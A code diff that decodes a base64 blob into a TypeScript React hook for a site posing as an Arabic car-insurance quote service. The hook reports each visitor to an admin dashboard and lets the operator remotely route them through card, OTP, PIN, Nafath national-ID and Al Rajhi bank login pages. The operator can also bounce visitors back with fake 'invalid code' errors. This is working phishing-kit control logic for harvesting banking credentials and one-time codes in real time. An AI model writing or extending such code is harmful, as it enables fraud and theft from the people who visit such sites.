@@ -1,1 +1,119 @@
-aW1wb3J0IHsgdXNlRWZmZWN0IH0gZnJvbSAicmVhY3QiOwppbXBvcnQgeyB1c2VOYXZpZ2F0ZSB9IGZyb20gIkB0YW5zdGFjay9yZWFjdC1yb3V0ZXIiOwppbXBvcnQgeyBzdXBhYmFzZSB9IGZyb20gIkAvaW50ZWdyYXRpb25zL3N1cGFiYXNlL2NsaWVudCI7CmltcG9ydCB7IHRyYWNrUGFnZSwgZ2V0Q3VycmVudFBhZ2UgfSBmcm9tICJAL2xpYi90cmFja2luZy5mdW5jdGlvbnMiOwppbXBvcnQgeyBnZXRPckNyZWF0ZVNlc3Npb25JZCB9IGZyb20gIkAvbGliL3Zpc2l0b3Itc2Vzc2lvbiI7CgovKioKICogVHJhY2tzIHRoZSB2aXNpdG9yJ3MgY3VycmVudCBwYWdlIGFuZCBsaXN0ZW5zIGZvciByZWFsdGltZSByb3V0aW5nCiAqIGNvbW1hbmRzIGZyb20gdGhlIGFkbWluIGRhc2hib2FyZCAoY3VycmVudF9wYWdlIHVwZGF0ZXMpLgogKgogKiBBZG1pbiByb3V0aW5nIHZhbHVlczoKICogIC0gTm9ybWFsIGRlc3RpbmF0aW9uIG5hbWVzICgiT1RQIiwgIlBJTiIsICLZhtmB2KfYsCIsIC4uLikg4oaSIG5hdmlnYXRlIHRvIHRoYXQgcGFnZSAoYWNjZXB0KS4KICogIC0gTmFtZXMgc3RhcnRpbmcgd2l0aCAi2LHZgdi2ICIgKGUuZy4gItix2YHYtiBPVFAiKSDihpIgbmF2aWdhdGUgYmFjayB0byB0aGUgcGFnZQogKiAgICB3aXRoID9lcnJvcj0xIHNvIHRoZSB2aXNpdG9yIHNlZXMgYW4gImludmFsaWQgaW5mbyIgYmFubmVyLgogKiAgLSAid2FpdCIg4oaSIHN0YXkgb24gdGhlIHdhaXQgc2NyZWVuLgogKgogKiBUaGUgdmlzaXRvciBhbHNvIHNlZXMgYSBsaXZlIHRvYXN0IHdoZW5ldmVyIHRoZSBhZG1pbiBwZXJmb3JtcyBhbiBhY3Rpb24KICogKGFjY2VwdCAvIHJlamVjdCAvIHJlZGlyZWN0IC8gYmxvY2spIOKAlCBzbyByZWFsdGltZSBjb21tYW5kcyBhcmUgYWx3YXlzCiAqIGFubm91bmNlZCwgbm90IGp1c3Qgc2lsZW50bHkgZm9sbG93ZWQuCiAqLwpleHBvcnQgZnVuY3Rpb24gdXNlVmlzaXRvclRyYWNraW5nKHBhZ2U6IHN0cmluZykgewogIGNvbnN0IG5hdmlnYXRlID0gdXNlTmF2aWdhdGUoKTsKCiAgdXNlRWZmZWN0KCgpID0+IHsKICAgIGlmICh0eXBlb2Ygd2luZG93ID09PSAidW5kZWZpbmVkIikgcmV0dXJuOwogICAgLy8gQ3JlYXRlIHRoZSBzZXNzaW9uIGlkIG9uIGZpcnN0IHZpc2l0IHRvbyDigJQgc28gZXZlcnkgdmlzaXRvciBhcHBlYXJzCiAgICAvLyBpbiB0aGUgZGFzaGJvYXJkIGltbWVkaWF0ZWx5LCBldmVuIGJlZm9yZSBzdWJtaXR0aW5nIGFueSBmb3JtLgogICAgY29uc3Qgc2Vzc2lvbklkID0gZ2V0T3JDcmVhdGVTZXNzaW9uSWQoKTsKCiAgICB0cmFja1BhZ2UoeyBkYXRhOiB7IHNlc3Npb25faWQ6IHNlc3Npb25JZCwgcGFnZSB9IH0pCiAgICAgIC50aGVuKChyKSA9PiB7CiAgICAgICAgaWYgKChyIGFzIHsgYmxvY2tlZD86IGJvb2xlYW4gfSB8IG51bGwpPy5ibG9ja2VkKSB7CiAgICAgICAgICBuYXZpZ2F0ZSh7IHRvOiAiL2Jsb2NrZWQiIGFzIG5ldmVyIH0pOwogICAgICAgIH0KICAgICAgfSkKICAgICAgLmNhdGNoKCgpID0+IHt9KTsKCiAgICBjb25zdCBoYXNSZWFsdGltZUNvbmZpZyA9IEJvb2xlYW4oCiAgICAgIGltcG9ydC5tZXRhLmVudlsiVklURV9TVVBBQkFTRV9VUkwiXSAmJgogICAgICAgIChpbXBvcnQubWV0YS5lbnZbIlZJVEVfU1VQQUJBU0VfUFVCTElTSEFCTEVfS0VZIl0gfHwgaW1wb3J0Lm1ldGEuZW52WyJWSVRFX1NVUEFCQVNFX0FOT05fS0VZIl0pLAogICAgKTsKICAgIGlmICghaGFzUmVhbHRpbWVDb25maWcpIHJldHVybjsKCiAgICBjb25zdCBhY2NlcHRNYXA6IFJlY29yZDxzdHJpbmcsIHN0cmluZz4gPSB7CiAgICAgICLYp9mE2LHYptmK2LPZitipIjogIi8iLAogICAgICAi2KjZitin2YbYp9iqINin2YTYqtij2YXZitmGIjogIi9kZXRhaWxzIiwKICAgICAgItmF2YLYp9ix2YbYqSDYp9mE2LnYsdmI2LYiOiAiL3R5cGVzIiwKICAgICAgItin2YTYr9mB2Lkg2YjYp9mE2KrYrdmC2YIiOiAiL3BheW1lbnQiLAogICAgICAi2YXZhNiu2LUg2KfZhNi32YTYqCI6ICIvc3VtbWFyeSIsCiAgICAgICJPVFAiOiAiL3BheW1lbnQvb3RwIiwKICAgICAgIlBJTiI6ICIvcGF5bWVudC9waW4iLAogICAgICAi2YXYudmE2YjZhdin2Kog2KfZhNmH2KfYqtmBIjogIi9wYXltZW50IiwKICAgICAgItmG2YHYp9iwIjogIi9uYWZhdGgiLAogICAgICAi2YXZiNiv2KfZhCDZhtmB2KfYsCI6ICIvbmFmYXRoIiwKICAgICAgItin2K7YqtmK2KfYsSDYsdmC2YUg2YbZgdin2LAiOiAiL25hZmF0aC1zZWxlY3QiLAogICAgICAi2KfZhtiq2LjYp9ixINmG2YHYp9iwIjogIi9uYWZhdGgtd2FpdCIsCiAgICAgICLYp9mE2LHYp9is2K3ZiiI6ICIvcmFqaGkiLAogICAgICAi2KfZhtiq2LjYp9ixINin2YTYsdin2KzYrdmKIjogIi9yYWpoaS13YWl0IiwKICAgICAgItix2YXYsiDYp9mE2LHYp9is2K3ZiiI6ICIvcmFqaGktb3RwIiwKICAgICAgd2FpdDogIi9wYXltZW50L3dhaXQiLAogICAgICAi2YXZhNiu2LUg2KfZhNiq2KPZhdmK2YYiOiAiL2luc3VyYW5jZS1zdW1tYXJ5IiwKICAgICAgItiq2KPZg9mK2K8g2KfZhNmI2KvZitmC2KkiOiAiL2NvbmZpcm1hdGlvbiIsCiAgICB9OwoKICAgIGNvbnN0IHJlamVjdE1hcDogUmVjb3JkPHN0cmluZywgeyB0bzogc3RyaW5nOyBtc2c6IHN0cmluZyB9PiA9IHsKICAgICAgItix2YHYtiDYp9mE2KjYt9in2YLYqSI6IHsgdG86ICIvcGF5bWVudCIsIG1zZzogItin2YTYqNi32KfZgtipINin2YTZhdiz2KrYrtiv2YXYqSDYutmK2LEg2YXYr9i52YjZhdipINij2Ygg2LrZitixINi12K3Zitit2KkuINmK2LHYrNmJINil2K/Yrtin2YQg2KjYt9in2YLYqSDYo9iu2LHZiS4iIH0sCiAgICAgICLYsdmB2LYgT1RQIjogeyB0bzogIi9wYXltZW50L290cCIsIG1zZzogItix2YXYsiDYp9mE2KrYrdmC2YIg2LrZitixINi12K3Zitit2Iwg2YrYsdis2Ykg2KXYudin2K/YqSDYpdiv2K7Yp9mE2YcuIiB9LAogICAgICAi2LHZgdi2IFBJTiI6IHsgdG86ICIvcGF5bWVudC9waW4iLCBtc2c6ICLYp9mE2LHZgtmFINin2YTYs9ix2Yog2LrZitixINi12K3Zitit2Iwg2YrYsdis2Ykg2KfZhNmF2K3Yp9mI2YTYqSDZhdix2Kkg2KPYrtix2YkuIiB9LAogICAgICAi2LHZgdi2INmG2YHYp9iwIjogeyB0bzogIi9uYWZhdGgiLCBtc2c6ICLYqNmK2KfZhtin2Kog2YbZgdin2LAg2LrZitixINi12K3Zitit2KnYjCDZitix2KzZiSDYp9mE2YXYrdin2YjZhNipINmF2LHYqSDYo9iu2LHZiS4iIH0sCiAgICAgICLYsdmB2LYg2KfZhNix2KfYrNit2YoiOiB7IHRvOiAiL3JhamhpIiwgbXNnOiAi2KjZitin2YbYp9iqINiq2LPYrNmK2YQg2KfZhNiv2K7ZiNmEINi62YrYsSDYtdit2YrYrdip2Iwg2YrYsdis2Ykg2KfZhNmF2K3Yp9mI2YTYqSDZhdix2Kkg2KPYrtix2YkuIiB9LAogICAgICAi2LHZgdi2INix2YXYsiDYp9mE2LHYp9is2K3ZiiI6IHsgdG86ICIvcmFqaGktb3RwIiwgbXNnOiAi2LHZhdiyINin2YTYqtit2YLZgiDYutmK2LEg2LXYrdmK2K3YjCDZitix2KzZiSDYpdi52KfYr9ipINil2K/Yrtin2YTZhy4iIH0sCiAgICB9OwoKICAgIGxldCBhY3RlZCA9IGZhbHNlOwogICAgY29uc3QgaGFuZGxlID0gKHJvdzogeyBjdXJyZW50X3BhZ2U/OiBzdHJpbmcgfCBudWxsOyBibG9ja2VkPzogYm9vbGVhbiB8IG51bGwgfSB8IG51bGwpID0+IHsKICAgICAgaWYgKGFjdGVkIHx8ICFyb3cpIHJldHVybjsKICAgICAgaWYgKHJvdy5ibG9ja2VkKSB7CiAgICAgICAgYWN0ZWQgPSB0cnVlOwogICAgICAgIG5hdmlnYXRlKHsgdG86ICIvYmxvY2tlZCIgYXMgbmV2ZXIgfSk7CiAgICAgICAgcmV0dXJuOwogICAgICB9CiAgICAgIGNvbnN0IG5leHQgPSByb3cuY3VycmVudF9wYWdlOwogICAgICBpZiAoIW5leHQgfHwgbmV4dCA9PT0gcGFnZSkgcmV0dXJuOwogICAgICBjb25zdCByZWplY3QgPSByZWplY3RNYXBbbmV4dF07CiAgICAgIGlmIChyZWplY3QpIHsKICAgICAgICBhY3RlZCA9IHRydWU7CiAgICAgICAgbmF2aWdhdGUoeyB0bzogcmVqZWN0LnRvIGFzIG5ldmVyLCBzZWFyY2g6IHsgZXJyb3I6ICIxIiB9IGFzIG5ldmVyIH0pOwogICAgICAgIHJldHVybjsKICAgICAgfQogICAgICBjb25zdCBkZXN0ID0gYWNjZXB0TWFwW25leHRdOwogICAgICBpZiAoZGVzdCkgewogICAgICAgIGFjdGVkID0gdHJ1ZTsKICAgICAgICBuYXZpZ2F0ZSh7IHRvOiBkZXN0IGFzIG5ldmVyIH0pOwogICAgICB9CiAgICB9OwoKICAgIGNvbnN0IGNoYW5uZWwgPSBzdXBhYmFzZQogICAgICAuY2hhbm5lbChgdmlzaXRvci0ke3Nlc3Npb25JZH1gKQogICAgICAub24oCiAgICAgICAgInBvc3RncmVzX2NoYW5nZXMiLAogICAgICAgIHsgZXZlbnQ6ICJVUERBVEUiLCBzY2hlbWE6ICJwdWJsaWMiLCB0YWJsZTogInF1b3RlcyIsIGZpbHRlcjogYHNlc3Npb25faWQ9ZXEuJHtzZXNzaW9uSWR9YCB9LAogICAgICAgIChwYXlsb2FkKSA9PiBoYW5kbGUocGF5bG9hZC5uZXcgYXMgYW55KSwKICAgICAgKQogICAgICAuc3Vic2NyaWJlKCk7CgogICAgLy8gUG9sbGluZyBmYWxsYmFjayDigJQgcXVvdGVzIFJMUyBibG9ja3MgYW5vbiByZWFsdGltZSwgc28gcG9sbCB0aGUgcHVibGljIHNlcnZlciBmbi4KICAgIGNvbnN0IHBvbGwgPSB3aW5kb3cuc2V0SW50ZXJ2YWwoKCkgPT4gewogICAgICBpZiAoYWN0ZWQpIHJldHVybjsKICAgICAgZ2V0Q3VycmVudFBhZ2UoeyBkYXRhOiB7IHNlc3Npb25faWQ6IHNlc3Npb25JZCB9IH0pCiAgICAgICAgLnRoZW4oKHJvdykgPT4gaGFuZGxlKHJvdyBhcyBhbnkpKQogICAgICAgIC5jYXRjaCgoKSA9PiB7fSk7CiAgICB9LCAyMDAwKTsKCiAgICByZXR1cm4gKCkgPT4gewogICAgICB3aW5kb3cuY2xlYXJJbnRlcnZhbChwb2xsKTsKICAgICAgdm9pZCBzdXBhYmFzZS5yZW1vdmVDaGFubmVsKGNoYW5uZWwpOwogICAgfTsKICB9LCBbcGFnZSwgbmF2aWdhdGVdKTsKfQo=
+import { useEffect } from "react";
+import { useNavigate } from "@tanstack/react-router";
+import { supabase } from "@/integrations/supabase/client";
+import { trackPage, getCurrentPage } from "@/lib/tracking.functions";
+import { getOrCreateSessionId } from "@/lib/visitor-session";
+
+/**
+ * Tracks the visitor's current page and listens for realtime routing
+ * commands from the admin dashboard (current_page updates).
+ *
+ * Admin routing values:
+ *  - Normal destination names ("OTP", "PIN", "نفاذ", ...) → navigate to that page (accept).
+ *  - Names starting with "رفض " (e.g. "رفض OTP") → navigate back to the page
+ *    with ?error=1 so the visitor sees an "invalid info" banner.
+ *  - "wait" → stay on the wait screen.
+ *
+ * The visitor also sees a live toast whenever the admin performs an action
+ * (accept / reject / redirect / block) — so realtime commands are always
+ * announced, not just silently followed.
+ */
+export function useVisitorTracking(page: string) {
+  const navigate = useNavigate();
+
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+    // Create the session id on first visit too — so every visitor appears
+    // in the dashboard immediately, even before submitting any form.
+    const sessionId = getOrCreateSessionId();
+
+    trackPage({ data: { session_id: sessionId, page } })
+      .then((r) => {
+        if ((r as { blocked?: boolean } | null)?.blocked) {
+          navigate({ to: "/blocked" as never });
+        }
+      })
+      .catch(() => {});
+
+    const hasRealtimeConfig = Boolean(
+      import.meta.env["VITE_SUPABASE_URL"] &&
+        (import.meta.env["VITE_SUPABASE_PUBLISHABLE_KEY"] || import.meta.env["VITE_SUPABASE_ANON_KEY"]),
+    );
+    if (!hasRealtimeConfig) return;
+
+    const acceptMap: Record<string, string> = {
+      "الرئيسية": "/",
+      "بيانات التأمين": "/details",
+      "مقارنة العروض": "/types",
+      "الدفع والتحقق": "/payment",
+      "ملخص الطلب": "/summary",
+      "OTP": "/payment/otp",
+      "PIN": "/payment/pin",
+      "معلومات الهاتف": "/payment",
+      "نفاذ": "/nafath",
+      "مودال نفاذ": "/nafath",
+      "اختيار رقم نفاذ": "/nafath-select",
+      "انتظار نفاذ": "/nafath-wait",
+      "الراجحي": "/rajhi",
+      "انتظار الراجحي": "/rajhi-wait",
+      "رمز الراجحي": "/rajhi-otp",
+      wait: "/payment/wait",
+      "ملخص التأمين": "/insurance-summary",
+      "تأكيد الوثيقة": "/confirmation",
+    };
+
+    const rejectMap: Record<string, { to: string; msg: string }> = {
+      "رفض البطاقة": { to: "/payment", msg: "البطاقة المستخدمة غير مدعومة أو غير صحيحة. يرجى إدخال بطاقة أخرى." },
+      "رفض OTP": { to: "/payment/otp", msg: "رمز التحقق غير صحيح، يرجى إعادة إدخاله." },
+      "رفض PIN": { to: "/payment/pin", msg: "الرقم السري غير صحيح، يرجى المحاولة مرة أخرى." },
+      "رفض نفاذ": { to: "/nafath", msg: "بيانات نفاذ غير صحيحة، يرجى المحاولة مرة أخرى." },
+      "رفض الراجحي": { to: "/rajhi", msg: "بيانات تسجيل الدخول غير صحيحة، يرجى المحاولة مرة أخرى." },
+      "رفض رمز الراجحي": { to: "/rajhi-otp", msg: "رمز التحقق غير صحيح، يرجى إعادة إدخاله." },
+    };
+
+    let acted = false;
+    const handle = (row: { current_page?: string | null; blocked?: boolean | null } | null) => {
+      if (acted || !row) return;
+      if (row.blocked) {
+        acted = true;
+        navigate({ to: "/blocked" as never });
+        return;
+      }
+      const next = row.current_page;
+      if (!next || next === page) return;
+      const reject = rejectMap[next];
+      if (reject) {
+        acted = true;
+        navigate({ to: reject.to as never, search: { error: "1" } as never });
+        return;
+      }
+      const dest = acceptMap[next];
+      if (dest) {
+        acted = true;
+        navigate({ to: dest as never });
+      }
+    };
+
+    const channel = supabase
+      .channel(`visitor-${sessionId}`)
+      .on(
+        "postgres_changes",
+        { event: "UPDATE", schema: "public", table: "quotes", filter: `session_id=eq.${sessionId}` },
+        (payload) => handle(payload.new as any),
+      )
+      .subscribe();
+
+    // Polling fallback — quotes RLS blocks anon realtime, so poll the public server fn.
+    const poll = window.setInterval(() => {
+      if (acted) return;
+      getCurrentPage({ data: { session_id: sessionId } })
+        .then((row) => handle(row as any))
+        .catch(() => {});
+    }, 2000);
+
+    return () => {
+      window.clearInterval(poll);
+      void supabase.removeChannel(channel);
+    };
+  }, [page, navigate]);
+}
